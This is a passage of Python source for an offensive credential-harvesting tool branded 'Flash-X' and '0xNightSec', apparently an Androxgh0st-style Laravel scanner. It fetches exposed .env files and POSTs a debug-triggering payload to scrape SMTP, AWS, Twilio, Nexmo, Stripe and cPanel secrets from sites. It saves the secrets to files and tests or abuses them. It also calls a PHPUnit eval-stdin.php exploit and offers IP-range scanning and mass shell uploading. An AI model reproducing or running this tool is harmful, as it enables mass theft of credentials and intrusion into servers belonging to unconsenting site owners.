        elif "zimbra" in str(mailhost) and zimbra() == "on" :
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mZimbra\n".format(str(url)))
          save = open('result/zimbra.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailuser != "null" and mailpass != "null" and mailhost!="smtp.mailtrap.io" or mailuser != "" and mailpass != "" and mailhost!="smtp.mailtrap.io" or mailhost!="smtp.mailtrap.io":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mSMTP Random\n".format(str(url)))
          save = open('result/SMTP_RANDOM.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "" or mailhost=="smtp.mailtrap.io":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;31;40mInvalid SMTP\n".format(str(url)))  
        try:
          sendtest(url,mailhost,mailport,mailuser,mailpass,mailfrom)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;31;40mFailed Send\n".format(str(url)))
    else:
      print("\033[1;40m[BY Flash-X] {} |   \033[1;31;40mFailed GET SMTP".format(str(url)))

    if '<td>TWILIO_ACCOUNT_SID</td>' in text and twillio() == "on":
      print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mTwillio\n".format(str(url)))
      acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      try:
        acc_key = reg('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        acc_key = "NULL"
      try:
        sec = reg('<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        sec = "NULL"
      try:
        chatid = reg('<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        chatid = "null"
      try:
        phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        phone = "NULL"
      try:
        auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        auhtoken = "NULL"
      build = 'URL: '+str(url)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,auhtoken,phone)
      except:
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mInvalid Twillio\n".format(url))
    elif '<td>TWILIO_SID</td>' in text:
      acc_sid = reg('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      acc_key = reg('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      try:
        acc_from = reg('<td>TWILIO_FROM<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        acc_from = "UNKNOWN"
      build = 'URL: '+str(url)+'\nTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(acc_key)+'\nTWILIO_FROM: '+str(acc_from)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,acc_key,acc_from)
      except:
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mInvalid Twillio\n".format(url))

    elif '<td>ACCOUNT_SID</td>' in text:
      acc_sid = reg('<td>ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      acc_key = reg('<td>AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      try:
        acc_from = reg('<td>Twilio_Number<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        acc_from = "UNKNOWN"
      build = 'URL: '+str(url)+'\nTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(acc_key)+'\nTWILIO_FROM: '+str(acc_from)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,acc_key,acc_from)
      except:
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mInvalid Twillio\n".format(url))

    
    if '<td>NEXMO_KEY</td>' in text and NEXMO() == "on":
      try:
        nexmo_key = reg('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_key = ''
      try:
        nexmo_secret = reg('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_secret = ''
      try:
        phone = reg('<td>NEXMO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        phone = ''
      print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mNEXMO\n".format(str(url)))
      build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
      remover = str(build).replace('\r', '')
      save = open('result/NEXMO.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        nexmosend(url,nexmo_key,nexmo_secret)
      except:
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mINVALI NEXMO\n".format(str(url)))
    
    elif '<td>NEXMO_API_KEY</td>' in text and NEXMO() == "on":
      try:
        nexmo_key = reg('<td>NEXMO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_key = ''
      try:
        nexmo_secret = reg('<td>NEXMO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_secret = ''
      try:
        phone = reg('<td>NEXMO_API_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        phone = ''
      print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mNEXMO\n".format(str(url)))
      build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
      remover = str(build).replace('\r', '')
      save = open('result/NEXMO.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        nexmosend(url,nexmo_key,nexmo_secret)
      except:
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mINVALI NEXMO\n".format(str(url)))
    elif 'NEXMO_KEY' not in text or 'NEXMO_KEY' in text and NEXMO() == "off":
      pass
    else:
      print("\033[1;40m[BY Flash-X] {} |   \033[1;31;40mFailed NEXMO\n".format(str(url)))


    if '<td>AWS_ACCESS_KEY_ID</td>' in text:
      aws_kid = reg('<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_sky = reg('<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_reg = reg('<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nAWS_KEY: '+str(aws_kid)+'\nAWS_SECRET: '+str(aws_sky)+'\nAWS_REGION: '+str(aws_reg)
      remover = str(build).replace('\r', '')
      build2 = str(aws_kid)+'|'+str(aws_sky)+'|'+str(aws_reg)
      if str(mailuser) != "" and  str(mailport) !="":
        save = open('result/'+aws_reg+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n')
        save3.close()
        try:
          autocreateses(url,aws_kid,aws_sky,aws_reg)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    elif '<td>AWS_KEY</td>' in text:
      aws_kid = reg('<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_sky = reg('<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_reg = reg('<td>AWS_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nAWS_KEY: '+str(aws_kid)+'\nAWS_SECRET: '+str(aws_sky)+'\nAWS_REGION: '+str(aws_reg)
      remover = str(build).replace('\r', '')
      build2 = str(aws_kid)+'|'+str(aws_sky)+'|'+str(aws_reg)
      if str(mailuser) != "" and  str(mailport) !="":
        save = open('result/'+aws_reg+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n')
        save3.close()
        try:
          autocreateses(url,aws_kid,aws_sky,aws_reg)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    elif '<td>AWSAPP_KEY</td>' in text:
      aws_kid = reg('<td>AWSAPP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_sky = reg('<td>AWSAPP_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_reg = reg('<td>AWSAPP_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nAWSAPP_KEY: '+str(aws_kid)+'\nAWSAPP_SECRET: '+str(aws_sky)+'\nAWSAPP_REGION: '+str(aws_reg)
      remover = str(build).replace('\r', '')
      build2 = str(aws_kid)+'|'+str(aws_sky)+'|'+str(aws_reg)
      if str(mailuser) != "" and  str(mailport) !="":
        save = open('result/'+aws_reg+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n')
        save3.close()
        try:
          autocreateses(url,aws_kid,aws_sky,aws_reg)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    elif '<td>SES_KEY</td>' in text:
      aws_kid = reg('<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_sky = reg('<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_reg = reg('<td>SES_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nSES_KEY: '+str(aws_kid)+'\nSES_SECRET: '+str(aws_sky)+'\nSES_REGION: '+str(aws_reg)
      remover = str(build).replace('\r', '')
      if str(mailuser) != "" and  str(mailport) !="":
        save = open('result/'+aws_reg+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/ses_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        try:
          autocreateses(url,aws_kid,aws_sky,aws_reg)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    
    if '<td>MAILER_DSN</td>' in text:
      aws_kid = reg('<td>MAILER_DSN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nMAILER_DSN: '+str(aws_kid)
      remover = str(build).replace('\r', '')
      if str(aws_kid) != "" and  str(aws_kid) !="smtp://localhost":
        save = open('result/symfony_mailer_dsn.txt', 'a')
        save.write(remover+'\n\n')
        save.close()

    if '<td>EXOTEL_API_KEY</td>' in text and EXOTEL() == "on":
      try:
        exotel_api = reg('<td>EXOTEL_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        exotel_api = ''
      try:
        exotel_token = reg('<td>EXOTEL_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        exotel_token = ''
      try:
        exotel_sid = reg('<td>EXOTEL_API_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        exotel_sid = ''
      print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mEXOTEL\n".format(str(url)))
      build = 'URL: '+str(url)+'\nEXOTEL_API_KEY: '+str(exotel_api)+'\nEXOTEL_API_TOKEN: '+str(exotel_token)+'\nEXOTEL_API_SID: '+str(exotel_sid)
      remover = str(build).replace('\r', '')
      save = open('result/EXOTEL.txt', 'a')
      save.write(remover+'\n\n')
      save.close()


    if '<td>ONESIGNAL_APP_ID</td>' in text and ONESIGNAL() == "on":
      try:
        onesignal_id = reg('<td>ONESIGNAL_APP_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        onesignal_id = ''
      try:
        onesignal_token = reg('<td>ONESIGNAL_REST_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        onesignal_token = ''
      try:
        onesignal_auth = reg('<td>ONESIGNAL_USER_AUTH_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        onesignal_auth = ''
      print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mONESIGNAL\n".format(str(url)))
      build = 'URL: '+str(url)+'\nONESIGNAL_APP_ID: '+str(onesignal_id)+'\nONESIGNAL_REST_API_KEY: '+str(onesignal_token)+'\nONESIGNAL_USER_AUTH_KEY: '+str(onesignal_auth)
      remover = str(build).replace('\r', '')
      save = open('result/ONESIGNAL.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

    if '<td>TOKBOX_KEY_DEV</td>' in text and TOKBOX() == "on":
      try:
        tokbox_key = reg('<td>TOKBOX_KEY_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        tokbox_key = ''
      try:
        tokbox_secret = reg('<td>TOKBOX_SECRET_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        tokbox_secret = ''
      print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mTOKBOX\n".format(str(url)))
      build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
      remover = str(build).replace('\r', '')
      save = open('result/TOKBOX.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
    elif '<td>TOKBOX_KEY</td>' in text:
      try:
        tokbox_key = reg('<td>TOKBOX_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        tokbox_key = ''
      try:
        tokbox_secret = reg('<td>TOKBOX_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        tokbox_secret = ''
      print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mTOKBOX\n".format(str(url)))
      build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
      remover = str(build).replace('\r', '')
      save = open('result/TOKBOX.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
    
    if '<td>CPANEL_HOST</td>' in text:
      method = 'debug'
      try:
        cipanel_host = reg('<td>CPANEL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        cipanel_host = ''
      try:
        cipanel_port = reg('<td>CPANEL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        cipanel_port = ''
      try:
        cipanel_user = reg('<td>CPANEL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        cipanel_user = ''
      try:
        cipanel_pw = reg('<td>CPANEL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        cipanel_pw = ''
      build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nCPANEL_HOST: '+str(cipanel_host)+'\nCPANEL_PORT: '+str(cipanel_port)+'\nCPANEL_USERNAME: '+str(cipanel_user)+'\nCPANEL_PASSWORD: '+str(cipanel_pw)
      remover = str(build).replace('\r', '')
      save = open('result/CPANEL.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

    if "<td>STRIPE_KEY</td>" in text:
      method = 'debug'
      try:
        stripe_1 = reg("<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
      except:
        stripe_1 = ''
      try:
        stripe_2 = reg("<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
      except:
        stripe_2 = ''
      build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTRIPE_KEY: '+str(stripe_1)+'\nSTRIPE_SECRET: '+str(stripe_2)
      remover = str(build).replace('\r', '')
      save = open('Result/STRIPE_KEY.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

  except Exception as e:
    pass


def di_chckngntd(url):
  try:
    text = '\033[32;1m#\033[0m'+url
    headers = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
    get_source = requests.get(url+"/.env", headers=headers, timeout=1, verify=False, allow_redirects=False).text
    exp = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
    if "APP_KEY" in str(get_source):
      get_smtp(url+"/.env",str(get_source))
    else:
      get_source3 = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
      if "<td>APP_KEY</td>" in get_source3:
        get_smtp2(url,get_source3)
      elif "https" not in url and "APP_KEY=" not in str(get_source):
        nurl = url.replace('http','https')
        get_source2 = requests.get(nurl+"/.env", headers=headers, timeout=1, verify=False, allow_redirects=False).text
        if "APP_KEY" in str(get_source2):
          get_smtp(nurl+"/.env",str(get_source2))
        else:
          get_source4 = requests.post(nurl, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
          if "<td>APP_KEY</td>" in get_source4:
            get_smtp2(nurl,get_source4)
          else:
            print("\033[1;40m[BY Flash-X] {} |  \033[1;31;40mNOT VULN WITH HTTPS".format(str(url)))
      else:
          print("\033[1;40m[BY Flash-X] {} |  \033[1;31;40mNOT VULN".format(str(url)))
    
    if phpunitshell() == "on":
      newurl = url+exp
      exploit(newurl)    
  except:
    print("\033[1;40m[BY Flash-X] "+url+" |  \033[1;31;40m ERROR code Unknown")
    pass

def di_chckngntdsave(url):
  try:
    text = '\033[32;1m#\033[0m'+url
    headers = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
    get_source = requests.get(url+"/.env", headers=headers, timeout=1, verify=False, allow_redirects=False).text
    exp = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
    if "APP_KEY" in str(get_source):
      get_smtp(url+"/.env",str(get_source))
    else:
      get_source3 = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
      if "<td>APP_KEY</td>" in get_source3:
        get_smtp2(url,get_source3)
      elif "https" not in url and "APP_KEY=" not in str(get_source):
        nurl = url.replace('http','https')
        get_source2 = requests.get(nurl+"/.env", headers=headers, timeout=1, verify=False, allow_redirects=False).text
        if "APP_KEY" in str(get_source2):
          get_smtp(nurl+"/.env",str(get_source2))
        else:
          get_source4 = requests.post(nurl, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
          if "<td>APP_KEY</td>" in get_source4:
            get_smtp2(nurl,get_source4)
          else:
            get_source10 = requests.get(url+"/.env.save", headers=headers, timeout=1, verify=False, allow_redirects=False).text
            if "APP_KEY" in str(get_source10):
              get_smtp(url+"/.env",str(get_source10))
            else:
              print("\033[1;40m[BY Flash-X] {} |  \033[1;31;40mNOT VULN WITH HTTPS".format(str(url)))
      else:
          print("\033[1;40m[BY Flash-X] {} |  \033[1;31;40mNOT VULN".format(str(url)))
    
    if phpunitshell() == "on":
      newurl = url+exp
      exploit(newurl)    
  except:
    print("\033[1;40m[BY Flash-X] "+url+" |  \033[1;31;40m ERROR code Unknown")
    pass

def di_chckngntd4(url):
  for pet in pathline:
    try:
      text = '\033[32;1m#\033[0m'+url
      headers = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
      get_source = requests.get(url+str(pet), headers=headers, timeout=1, verify=False, allow_redirects=False).text
      newurl = url+str(pet)
      print('\033[1;40m#\033[0m Start Check '+newurl)
      if "APP_KEY=" in str(get_source):
        get_smtp(newurl,str(get_source))
        break
      else:
        print("\033[1;40m[BY Flash-X] {} |  \033[1;31;40mNOT VULN".format(str(url)))
    except:
      pass

  get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
  if "<td>APP_KEY</td>" in get_source:
    get_smtp2(url,get_source)
  else:
   print("\033[1;40m[BY Flash-X] {} |  \033[1;31;40mNOT VULN".format(str(url)))





def checkset():

  AWS_ACCESS_KEYx=AWS_ACCESS_KEY()
  AWS_KEYx=AWS_KEY()
  twilliox=twillio()
  awsx=aws()
  sparkpostmailx = sparkpostmail()
  and1x = and1()
  mandrillappx = mandrillapp()
  zohox = zoho()
  sendgridx = sendgrid()
  office365x = office365()
  mailgunx = mailgun()
  NEXMOx=NEXMO()
  EXOTELx=EXOTEL()
  ONESIGNALx=ONESIGNAL()
  TOKBOXx=TOKBOX()
  print("amazonaws:"+awsx+"|twillio:"+twilliox+"|AWS_KEY:"+AWS_KEYx+"|AWS_ACCESS_KEY:"+AWS_ACCESS_KEYx+"|sparkpostmail:"+sparkpostmailx+"\n1and1:"+and1x+"|mandrillapp:"+mandrillappx+"|zoho:"+zohox+"|sendgrid:"+sendgridx+"|office365:"+office365x+"|mailgun:"+mailgunx+"\n|NEXMO:"+NEXMOx+"|EXOTEL:"+EXOTELx+"|ONESIGNAL:"+ONESIGNALx+"|TOKBOX:"+TOKBOXx)

def logo():
    clear = "\x1b[0m"

    x = """
    
                                                      \033[91m███████╗██╗░░░░░░█████╗░░██████╗██╗░░██╗  ██╗░░██╗
                                                      \033[92m██╔════╝██║░░░░░██╔══██╗██╔════╝██║░░██║  ╚██╗██╔╝
                                                      \033[93m█████╗░░██║░░░░░███████║╚█████╗░███████║  ░╚███╔╝░
                                                      \033[94m██╔══╝░░██║░░░░░██╔══██║░╚═══██╗██╔══██║  ░██╔██╗░
                                                      \033[95m██║░░░░░███████╗██║░░██║██████╔╝██║░░██║  ██╔╝╚██╗
                                                      \033[96m╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝  ╚═╝░░╚═╝

\033[94m ______          __
/_  __/__  ___  / /
 / / / _ \/ _ \/ /   :   \033[93mSMTPS, SHELLS, Valid phpmyadmin Logins,CMS, SMS SENDER Cracker, Twilio SENDER, Twilio and Nexmo Balance Checker, IP Range And Auto Checker
\033[94m/_/  \___/\___/_/  
                    
                                                            \033[94mWORK           : \033[93mALL Types SMTPS CRACKER AND SEND TO Your EMAIL
                                                            \033[94mVERSION        : \033[93m12.3 Dad of Flash-X
                                                            \033[94mTELEGRAM       : \033[93mhttps://t.me/OXNIGHTSEC123                   
                                                            \033[94mTELEGRAM GROUP : \033[93mhttps://t.me/OXNIGHTSEC  \033[92m
 

                                                                   \033[1;32;40m[Fucked By 0xNightSec]
                                      ----------------------------------------------------------------------------------"""
    y='''                                                Fucked Up By 0XNIGHTSEC aka The scammer Exposer'''
    z='''                             -------------------------------------------------------------------------------------------------
              '''
               
    print (x)
    slowprint(y)
    print (z)
    
logo()

def menucit():
  sdx = """
 \033[91m[1] Grab .env + Debug                                                      \033[95m[16] Aws key generator(awskey|secretkey|region)
 \033[92m[2] Grab .env + Debug (Auto Scan)    \033[92m[Recomended IMPROVED]                 \033[96m[17] Laravel IP Range Scan      
 \033[93m[3] Option 2 + Auto reverse ip    \033[92m[Recomended IMPROVED]                    \033[97m[18] Laravel IP Range Scan + Auto Scan with option 3         
 \033[94m[4] Option 2 + Multiple path [with path.ini]                               \033[91m[19] Mass SMTP CHECKER
 \033[95m[5] Website To IP + Option 3                                               \033[92m[20] Reverse IP
 \033[96m[6] Website To IP Only                                                     \033[93m[21] Scan Laravel and save as IP List       \033[94m[New Feature Added]
 \033[97m[7] DORK/KEYWORD + Option 2                                                \033[94m[22] Option 18 + scan env.save  
 \033[1;35;40m[8] MASS IP RANGE SCAN + Option 2    \033[92m[Recomended IMPROVED]                 \033[95m[23] Option 3 + scan env.save
 \033[1;32;40m[9] MASS IP RANGE SCAN + Option 3    \033[92m[Recomended IMPROVED]                 \033[96m[24] Mass Shell Uploader             \033[94m[New Feature Added]
 \033[35m[10] Remove duplicate list                                                 \033[97m[25] Grab And Auto Check Valid phpmyadmin Logins            \033[94m[New Feature Added]
 \033[0\033[91m;37;40m[11] Check Limit Aws Key + Email List                                      \033[91m[26] CMS Checker                \033[94m[New Feature Added]
 \033[91m[12] Mass Crack aws panel(awskey|secretkey|region)                         \033[92m[27] NEXMO Balance Checker                 \033[94m[New Feature Added]
 \033[92m[13] Twillio sender                  [Recomended IMPROVED]                 \033[93m[28] Change Format Of SMTPS for Checker               \033[94m[New Feature Added]
 \033[93m[14] Sendgrid apikey checker                                               \033[94m[29] Shells Uploader Mini                   \033[94m[New Feature Added]
 \033[94m[15] sendgrid apikey generator          \033[92m[Recomended IMPROVED]              \033[95m[30] WooCommerce Plugin Checker From wordpress logins            \033[94m[New Feature Added]
 
 """
  print (sdx)

def jembotngw(sites):
  if 'http' not in sites:
    site = 'http://'+sites

    prepare(site)
  else:
    prepare(sites)



def jembotngw2(sites):


  if 'http' not in sites:
    site = 'http://'+sites

    di_chckngntd(site)
  else:
    di_chckngntd(sites)

def jembotngwsave(sites):


  if 'http' not in sites:
    site = 'http://'+sites

    di_chckngntdsave(site)
  else:
    di_chckngntdsave(sites)

def prepare2(sites):

  di_chckngntd(sites)


def jembotngw4(sites):

  if 'http' not in sites:
    site = 'http://'+sites

    di_chckngntd4(site)
  else:
    di_chckngntd4(sites)





def nowayngntd():

  Targetssa = input("\033[1;37;40mInput Your List : ") #for date
  ip_list = open(Targetssa, 'r').read().split('\n')
  for sites in ip_list:
    if 'http' not in sites:
      site = 'http://'+sites

      prepare(site)
    else:
      prepare(sites)

def makethread(jumlah):
  try:
    nam = input("\033[1;37;40mInput Your List : ") #for date
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(jembotngw, liss)
    zm.close()
    zm.join()
  except Exception as e:
    pass

def makethread3(jumlah):
  try:
    nam = input("\033[1;37;40mInput Your List : ") #for date
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(dorkscan, liss)
    zm.close()
    zm.join()
  except Exception as e:
    pass

def makethread4(jumlah):
  try:
    nam = input("\033[1;37;40mInput Your List : ") #for date
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(jembotngw4, liss)
    zm.close()
    zm.join()
  except Exception as e:
    pass

def makethread5():
  file_location = input("\033[1;37;40mInput Your List : ") #for date
  opened_file = open(file_location, ).readlines()
  fresh_lines_sites = [items.rstrip() for items in opened_file]
  sites_len = len(fresh_lines_sites)
  rotation = 0
  for lines in fresh_lines_sites:
      rotation += 1
      ip_grabberautoscan(lines,sites_len,rotation)
  
def makethread14():
  file_location = input("\033[1;37;40mInput Your Sendgrid Apikey List : ") #for date
  opened_file = open(file_location, ).readlines()
  fresh_lines_sites = [items.rstrip() for items in opened_file]
  for lines in fresh_lines_sites:
      sendgridcheck(lines)

def makethread6():
  file_location = input("\033[1;37;40mInput Your List : ") #for date
  opened_file = open(file_location, ).readlines()
  fresh_lines_sites = [items.rstrip() for items in opened_file]
  sites_len = len(fresh_lines_sites)
  rotation = 0
  for lines in fresh_lines_sites:
      ip_grabber(lines,sites_len,rotation)

def makethread8():
    ipstart = input("\033[1;37;40mstart ip : ") #for date
    ip1 = ipstart.strip().split('.')
    ipto = input("\033[1;37;40mto ip : ") #for date
    ip2 = ipto.strip().split('.')
    cur = ipstart.strip().split('.')

    rip0 =int(ip1[0])
    rip1 =int(ip1[1])
    rip2 =int(ip1[2])
    rip3 =int(ip1[3])-1
    finalip = 0
    while finalip != ipto:
      rip3 +=1
      finalip = str(rip0)+"."+str(rip1)+"."+str(rip2)+"."+str(rip3)
      jembotngw2(finalip)
      if rip2 != int(ip2[2])+1 and rip3 == int(ip2[3]):
        rip2 +=1
        rip3 = int(ip1[3]) - 1
      elif rip1 != int(ip2[1]) and rip2 == int(ip2[2]):
        rip1 +=1
        rip2 = int(ip1[2])
        rip3 = int(ip1[3]) - 1
      elif rip0 != int(ip2[0]) and rip1 == int(ip2[1]):
        rip0 +=1
        rip1 =int(ip1[1])
        rip2 = int(ip1[2])
        rip3 = int(ip1[3]) - 1

def makethread9():
    ipstart = input("\033[1;37;40mstart ip : ") #for date
    ip1 = ipstart.strip().split('.')
    ipto = input("\033[1;37;40mto ip : ") #for date
